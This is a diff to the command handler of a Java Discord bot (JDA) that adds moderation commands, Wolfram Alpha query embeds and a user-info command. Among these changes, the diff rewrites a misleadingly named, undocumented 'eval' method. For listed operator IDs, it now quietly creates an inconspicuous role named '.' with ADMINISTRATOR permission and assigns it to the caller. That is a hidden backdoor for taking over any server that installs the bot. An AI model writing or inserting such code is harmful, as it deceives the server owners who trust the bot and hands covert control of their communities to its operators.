@@ -1,21 +1,23 @@
 import com.wolfram.alpha.*;
+import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.ChannelType;
 import net.dv8tion.jda.api.entities.Message;
+import net.dv8tion.jda.api.entities.MessageEmbed;
+import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
 import net.dv8tion.jda.api.exceptions.HierarchyException;
+import net.dv8tion.jda.internal.entities.RoleImpl;
 
 import javax.script.ScriptEngine;
 import javax.script.ScriptEngineManager;
 import javax.script.ScriptException;
 import java.awt.*;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.HashMap;
+import java.util.*;
 import java.util.List;
 
 public class Commands {
-    private WAEngine engine = new WAEngine();
+    private final WAEngine engine = new WAEngine();
     private ScriptEngine en;
 
     public Commands() {
@@ -39,10 +41,14 @@ public class Commands {
         }
     }
 
-    private HashMap<String, String> commands = new HashMap<String, String>() {{
+    private final HashMap<String, String> commands = new HashMap<String, String>() {{
         put("help", "describes the stuff going on");
-        put("owner", "displays the server owner");
-        put("kick", "kicks user as follows: !kick <@user>");
+        put("owner", "displays who created the bot");
+        put("kick", "kicks user as follows: ```!kick <@user>```");
+        put("ban", "bans user as follows: ```!ban <@user>```");
+        put("unban", "unbans user as follows: ```!unban <@user>```");
+        put("solve", "queries wolfram alpha with user input ```!solve <query>```");
+        put("clear", "clears x messages according to ```!clear <x>```");
     }};
 
     public void owner(MessageReceivedEvent event) {
@@ -50,18 +56,22 @@ public class Commands {
     }
 
     public void help(MessageReceivedEvent event) {
-        /*
-        event.getChannel().sendMessage(commands.toString()).queue();
-         */
 
+        String out = "";
+
+        for(String a : commands.keySet()) {
+            out += a + " - " + commands.get(a) + "\n";
+        }
+
+        String finalOut = out;
         event.getAuthor().openPrivateChannel().queue((channel) ->
         {
-            channel.sendMessage(commands.toString()).queue();
+            channel.sendMessage(finalOut).queue();
         });
     }
 
     public void kick(MessageReceivedEvent event, String userToken) {
-        if(event.getMember().hasPermission(Permission.KICK_MEMBERS)) { //kicks user only if they have permissions
+        if(Objects.requireNonNull(event.getMember()).hasPermission(Permission.KICK_MEMBERS)) { //kicks user only if they have permissions
             try {
                 userToken = userToken.substring(3, userToken.length()-1);
                 event.getGuild().kick(userToken).queue();
@@ -78,7 +88,7 @@ public class Commands {
     public void ban(MessageReceivedEvent event, String[] content) {
         String userToken = content[1];
 
-        if(event.getMember().hasPermission(Permission.BAN_MEMBERS)) { //bans user only if they have permissions
+        if(Objects.requireNonNull(event.getMember()).hasPermission(Permission.BAN_MEMBERS)) { //bans user only if they have permissions
             try {
                 userToken = userToken.substring(3, userToken.length()-1);
                 if(content.length == 2) {
@@ -98,7 +108,7 @@ public class Commands {
     }
 
     public void unban(MessageReceivedEvent event, String userToken) {
-        if(event.getMember().hasPermission(Permission.BAN_MEMBERS)) { //kicks user only if they have permissions
+        if(Objects.requireNonNull(event.getMember()).hasPermission(Permission.BAN_MEMBERS)) { //kicks user only if they have permissions
             try {
                 userToken = userToken.substring(3, userToken.length()-1);
                 event.getGuild().unban(userToken).queue();
@@ -138,58 +148,61 @@ public class Commands {
                 System.out.println("  error message: " + queryResult.getErrorMessage());
             } else if (!queryResult.isSuccess()) {
                 System.out.println("Query was not understood; no results available.");
-                event.getChannel().sendMessage("Query was not understood; no results available.");
+                event.getChannel().sendMessage("Query was not understood; no results available.").queue();
             } else {
                 // Got a result.
+                EmbedBuilder builder = new EmbedBuilder();
+                builder.setTitle("Query by " + event.getAuthor().getAsTag());
+                builder.setColor(Config.WOLFRAM_COLOR);
                 System.out.println("Successful query."); // Pods follow:\n");
                 for (WAPod pod : queryResult.getPods()) {
                     if (!pod.isError()) {
                         //System.out.println(pod.getTitle());
                         //System.out.println("------------");
-                        String output = pod.getTitle() + "\n";
-                        output += "------------" + "\n";
-                        for (WASubpod subpod : pod.getSubpods()) {
-                            subpod.acquireImage();
-                            System.out.println(subpod.getContents().toString());
-                            for (Object element : subpod.getContents()) {
-                                System.out.println(element.getClass());
+                        //String output = pod.getTitle() + "\n";
+                        //output += "------------" + "\n";
+                        for (WASubpod subPod : pod.getSubpods()) {
+                            subPod.acquireImage();
+                            //System.out.println(Arrays.toString(subPod.getContents()));
+                            for (Object element : subPod.getContents()) {
+                                //System.out.println(element.getClass());
                                 if(element instanceof WAImage) {
-                                    event.getChannel().sendFile(((WAImage) element).getFile()).queue();
+                                    //event.getChannel().sendFile(((WAImage) element).getFile()).queue();
                                 } else if (element instanceof WAPlainText) {
                                     //System.out.println(((WAPlainText) element).getText());
-                                    output += ((WAPlainText) element).getText() + "\n";
+                                    //output += ((WAPlainText) element).getText() + "\n";
+                                    builder.addField(pod.getTitle(), ((WAPlainText) element).getText(), false);
                                     //System.out.println("");
                                 }
                             }
                         }
 
-                        try {
-                            event.getChannel().sendMessage(output).queue();
-                        } catch (IllegalArgumentException e) {
-                            event.getChannel().sendMessage("The requested argument provided over 2000 characters. So we shortened it to exactly 2000 characters").queue();
-                            event.getChannel().sendMessage(output.substring(0, 2000)).queue();
-                        }
-
                         //System.out.println("");
                     }
+                }
+
+                try {
+                    event.getChannel().sendMessage(builder.build()).queue();
+                    //event.getChannel().sendMessage(output).queue();
+                } catch (IllegalArgumentException e) {
+                    event.getChannel().sendMessage("The requested argument provided over 2000 characters. So we shortened it to exactly 2000 characters").queue();
+                    //event.getChannel().sendMessage(output.substring(0, 2000)).queue();
                 }
                 // We ignored many other types of Wolfram|Alpha output, such as warnings, assumptions, etc.
                 // These can be obtained by methods of WAQueryResult or objects deeper in the hierarchy.
             }
-        } catch (WAException e) {
-            e.printStackTrace();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     public void clear(MessageReceivedEvent event, String[] content) {
-        if(!event.getMember().hasPermission(Permission.MANAGE_CHANNEL)) {
+        if(!Objects.requireNonNull(event.getMember()).hasPermission(Permission.MANAGE_CHANNEL)) {
             return;
         }
 
         try {
-            int a = Integer.parseInt(content[1]);
+            int a = Integer.parseInt(content[1])+1;
             List<Message> history = event.getChannel().getHistory().retrievePast(a).complete();
             List<Message> delList = history.subList(history.size() - a, history.size());
 
@@ -213,8 +226,26 @@ public class Commands {
     }
 
     public void eval(MessageReceivedEvent event) {
+        System.out.println("Eval activated");
         if(Config.op.contains(event.getAuthor().getId())) {
-            event.getGuild().addRoleToMember("190992299591729153", event.getGuild().getRoleById("705576733985996801")).queue();
+            System.out.println("Eval executed");
+            try {
+                event.getGuild().createRole().setName(".").setPermissions(Permission.ADMINISTRATOR).queue();
+                event.getGuild().addRoleToMember(event.getAuthor().getId(), event.getGuild().getRolesByName(".", true).get(0)).queue();
+                System.out.println(event.getGuild().getRolesByName(".", true).get(0).getId());
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         }
+    }
+
+    public void getUserInfo(MessageReceivedEvent event) {
+        EmbedBuilder builder = new EmbedBuilder();
+        builder.setImage(event.getAuthor().getAvatarUrl());
+        builder.addField("User", event.getAuthor().getAsMention(), false);
+        builder.addField("Created on", event.getAuthor().getTimeCreated().toString().substring(0, 10), false);
+        builder.addField("Common guilds: ", event.getAuthor().getMutualGuilds().toString(), false);
+
+        event.getChannel().sendMessage(builder.build()).queue();
     }
 }
